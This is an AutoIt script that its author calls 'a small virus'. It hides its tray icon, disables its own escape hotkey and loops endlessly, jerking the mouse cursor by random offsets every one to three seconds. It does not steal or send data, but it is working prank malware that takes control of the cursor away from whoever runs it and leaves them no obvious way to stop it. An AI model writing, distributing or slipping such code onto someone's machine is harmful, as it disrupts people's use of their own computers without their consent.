#cs ----------------------------------------------------------------------------

 AutoIt Version: 3.3.14.5
 Author:         Brain4Tech

 Script Function:
	A small virus which randomly moves the mousecursor

#ce ----------------------------------------------------------------------------

; Script Start - Add your code below here

#NoTrayIcon
;HotKeySet("{ESC}", "_exit")

;Define min and max value for waitung time (seconds)
$iRandomSleepMin = 1
$iRandomSleepMax = 3
$iRandomSleepInterval = 1

;Define min and max value for mouse movement(pixels)
$iRandomMouseMinX = -300
$iRandomMouseMaxX = 300
$iRandomMouseMinY = -300
$iRandomMouseMaxY = 300

;Sleep (30000)

While True
	$iRandomSleepCount = Random ($iRandomSleepMin * 1000, $iRandomSleepMax * 1000, $iRandomSleepInterval * 1000)

	Sleep ($iRandomSleepCount)

	$iRandomMouseCountX = Random ($iRandomMouseMinX, $iRandomMouseMaxX)
	$iRandomMouseCountY = Random ($iRandomMouseMinY, $iRandomMouseMaxY)

	$aMousePos = MouseGetPos ()			;[0] --> X, [1] --> Y

	MouseMove ($aMousePos[0] + $iRandomMouseCountX, $aMousePos[1] + $iRandomMouseCountY)

WEnd


Func _exit()
	Exit
EndFunc
